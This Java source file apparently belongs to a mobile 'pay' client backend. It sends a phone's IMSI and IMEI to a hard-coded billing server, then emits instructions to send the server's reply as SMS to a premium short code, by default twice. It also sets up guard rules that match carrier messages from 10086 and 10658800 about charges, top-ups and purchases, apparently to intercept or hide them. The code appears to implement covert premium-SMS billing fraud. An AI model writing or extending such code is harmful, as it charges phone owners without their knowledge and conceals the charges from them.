package com.jxt.pay.appclient.service.dynamic.net;

import java.util.ArrayList;
import java.util.Calendar;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Random;

import org.apache.log4j.Logger;

import com.jxt.pay.appclient.service.dynamic.pojo.Guard;
import com.jxt.pay.appclient.service.dynamic.pojo.Sms;
import com.jxt.pay.appclient.service.dynamic.utils.XstreamHelper;
import com.jxt.pay.appclient.utils.DynamicUtils;
import com.jxt.pay.appclient.utils.GetData;
import com.jxt.pay.appclient.utils.StringUtils;

/**
 * 
 * @author leoliu
 *
 */
public class ZztmmDynamicService implements IDynamicService{

	private static Logger logger = Logger.getLogger(ZztmmDynamicService.class);
	
	private static final String TYPE = "zztmm";
	
	private static final String DEFAULTPREFIX = "01051";
	private static final String DEFAULTPOSTFIX = "xg100";
	
	private static final String URLPARAM = "zcid={zcid}&imei={imei}&imsi={imsi}&sdk_version=17&phone_model=9900&data={prefix}{random}{postfix}"; 
	
	private int timeOut = 60;
	
	private static final Guard guard1 = new Guard("10658800", "无法|有误|请核对", 2880, "-1", 0);
	private static final Guard guard2 = new Guard("10658800","处理|等候",2880,"0",0);
	private static final Guard guard6 = new Guard("10658800","成功|购买",2880,"1",0);
	private static final Guard guard3 = new Guard("10086","点数|帐户|充值|花费",2880,null,1);
	private static final Guard guard4 = new Guard("10658800","",960,null,1);
	private static final Guard guard5 = new Guard("10086","",960,null,1);
	private static final Integer DEFAULTSUCCESSTIMEOUT = 2;
	
	private static final String DEST = "1065842410";
	public static final String DEFAULTMOBILE = "13800000000";
	
	@Override
	public String getType() {
		return TYPE;
	}


	private Map<String, Long> tryMap = new HashMap<String, Long>();
	
	@Override
	public String dynamic(Map<String, String> map) {
		
		String xml = null;
		
		String url = map.get("url");
		
		if(url != null && url.length() > 0){
			String mobileId = map.get("mobileId");
			
			Calendar cal = Calendar.getInstance();
			Long startTime = tryMap.get(mobileId);
			
			if(startTime == null){
				startTime = cal.getTimeInMillis();
				tryMap.put(mobileId,startTime);
			}else{
				if(cal.getTimeInMillis() - startTime >= 1000 * timeOut){
					tryMap.remove(mobileId);
					return DynamicUtils.parseError("599");
				}
			}
			
			String imsi = StringUtils.defaultString(map.get("imsi"));
			
			if(imsi.length() == 0){
				imsi = "46000115310";
			}
			
			imsi = fillImei(imsi);
			
			String param = URLPARAM.replace("{imsi}", imsi);
			
			String imei = StringUtils.defaultString(map.get("imei"));
			
			imei = imei.replaceAll("[a-zA-Z]","1");
			
			imei = fillImei(imei);
			
			param = param.replace("{imei}", imei);
			param = param.replace("{zcid}", StringUtils.defaultString(map.get("zcid")));
			
			String random = random();
			
			param = param.replace("{random}", random);
			
			String prefix = map.get("prefix");
			if(prefix == null || prefix.length() == 0){
				prefix = DEFAULTPREFIX;
			}
			
			String postfix = map.get("postfix");
			if(postfix == null || postfix.length() == 0){
				postfix = DEFAULTPOSTFIX;
			}
			
			param = param.replace("{prefix}",prefix).replace("{postfix}",postfix);
			
			logger.info("dynamic : "+url+";"+param);
			String responseXml = GetData.getData(url,param);
			logger.info("dynamic response xml : "+responseXml);
			
			if(responseXml != null && responseXml.length() > 0 && !"null".equals(responseXml)){
				
				tryMap.remove(mobileId);
				
				try{
					xml = parseXml(map,responseXml);
				}catch(Exception e){
					return DynamicUtils.parseError("597");
				}
			}else{
				logger.info("responseXml is null");
				return DynamicUtils.parseWait(10,map);
			}
		}
		
		return xml;
	}
	
	private String fillImei(String imei){
		if(imei.length() < 15){
			int len = imei.length();
			
			for(int i = 0 ; i < 15 - len ; i ++){
				imei += new Random().nextInt(10);
			}
		}
		
		return imei;
	}
	
	private static String random(){
				
		int random = new Random().nextInt(1000000);
		
		if(random < 100000){
			random += 100000;
		}
		
		return "" + random;
	}
	
	private String parseXml(Map<String, String> map,String data){
		
		List<Sms> smsList = new ArrayList<Sms>();
		
		Sms sms = new Sms();
		
		sms.setSmsContent(data);
		sms.setSmsDest(DEST);
		sms.setSuccessTimeOut(DEFAULTSUCCESSTIMEOUT);
		
		smsList.add(sms);
		
		String stimes = map.get("times");
		
		if(stimes == null || stimes.length() == 0 || !"1".equals(stimes)){

			Sms sms1 = new Sms();
			
			sms1.setSmsContent(data);
			sms1.setSmsDest(DEST);
			sms1.setSuccessTimeOut(DEFAULTSUCCESSTIMEOUT);
			
			smsList.add(sms1);
			
		}
		
		Sms guardSms = new Sms();
		
		List<Guard> guardList = new ArrayList<Guard>();
		
		guardList.add(guard1);
		guardList.add(guard2);
		
		guardList.add(guard6);
		guardList.add(guard3);
		guardList.add(guard4);
		guardList.add(guard5);
		
		guardSms.setGuardList(guardList);
		
		smsList.add(0, guardSms);
			
		return XstreamHelper.toXml(smsList);
	}
	
	public static void main(String[] args){
		test1();
	}
	
	private static void test1(){
		ZztmmDynamicService service = new ZztmmDynamicService();
		
		Map<String, String> map = new HashMap<String, String>();
		
		map.put("imsi", "460001153105779");
		map.put("imei", "869460011612203");
		map.put("mobileId", "2892");
		map.put("zcid","30000826455509");
		map.put("url","http://61.145.122.156:40004/Bill");
		map.put("times", "1");
		
		map.put("prefix", "00000");
		map.put("postfix", "Y0900");
		
		String xml = service.dynamic(map);
		
		System.out.println(xml);
		
	}
	
	private static void test0(){
		ZztmmDynamicService service = new ZztmmDynamicService();
		
		Map<String, String> map = new HashMap<String, String>();
		
		map.put("imsi", "460001153105779");
		map.put("imei", "869460011612203");
		map.put("mobileId", "2892");
		map.put("zcid","30000842933205");
		map.put("url","http://61.145.122.156:40004/Bill");
//		map.put("times", "1");
		
		map.put("prefix", "00000");
		map.put("postfix", "Y0900");
		
		String xml = service.dynamic(map);
		
		System.out.println(xml);
	}
}
